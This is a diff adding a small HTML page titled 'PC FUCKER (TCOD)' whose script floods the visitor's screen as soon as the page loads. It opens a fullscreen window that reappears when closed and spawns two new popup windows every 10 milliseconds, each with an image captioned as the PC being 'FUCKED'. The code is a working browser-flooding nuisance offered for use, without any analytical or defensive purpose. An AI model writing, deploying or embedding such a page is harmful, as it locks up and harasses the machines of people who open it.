@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PC FUCKER (TCOD)</title>
+</head>
+<body>
+<script>
+var images = [
+    'https://via.placeholder.com/300x300/FF0000/FFFFFF',
+    'https://via.placeholder.com/300x300/00FF00/FFFFFF',
+    'https://via.placeholder.com/300x300/0000FF/FFFFFF',
+    'https://via.placeholder.com/300x300/FFFF00/FFFFFF'
+];
+
+var fullscreenPopup = null;
+
+function createNormalPopup() {
+    var randomImage = images[Math.floor(Math.random() * images.length)];
+    var screenWidth = window.screen.width;
+    var screenHeight = window.screen.height;
+    var randomX = Math.floor(Math.random() * screenWidth);
+    var randomY = Math.floor(Math.random() * screenHeight);
+    var popupWidth = 400;
+    var popupHeight = 400;
+    var newWindow = window.open("", "_blank", "width=" + popupWidth + ",height=" + popupHeight + ",left=" + randomX + ",top=" + randomY);
+    if (newWindow) {
+        newWindow.document.write('<img src="' + randomImage + '" alt="You PC is FUCKED!" style="width:100%;height:100%;">');
+    }
+}
+
+function createFullscreenPopup() {
+    var randomImage = images[Math.floor(Math.random() * images.length)];
+    fullscreenPopup = window.open("", "_blank", "width=800,height=600");
+    if (fullscreenPopup) {
+        var popupHTML = '<html><head>' +
+                        '<style>html,body{margin:0;padding:0;height:100%;overflow:hidden;}</style>' +
+                        '</head><body>' +
+                        '<img src="' + randomImage + '" alt="your PC is FUCKED" style="width:100%;height:100%;">' +
+                        '<script>' +
+                        'var goFullscreen = function(){' +
+                        '   if(document.documentElement.requestFullscreen){' +
+                        '       document.documentElement.requestFullscreen().catch(function(err){console.log("Fullscreen failed:", err);});' +
+                        '   }' +
+                        '};' +
+                        'setTimeout(goFullscreen, 500);' +
+                        'document.addEventListener("fullscreenchange", function(){' +
+                        '   if(!document.fullscreenElement){window.close();}' +
+                        '});' +
+                        '</scr' + 'ipt>' + 
+                        '</body></html>';
+
+        fullscreenPopup.document.write(popupHTML);
+        fullscreenPopup.document.close();
+    }
+}
+
+createFullscreenPopup();
+
+setInterval(function() {
+    createNormalPopup();
+    createNormalPopup();
+    if (fullscreenPopup && fullscreenPopup.closed) {
+        createFullscreenPopup();
+    }
+}, 10);
+</script>
+</body>
+</html>
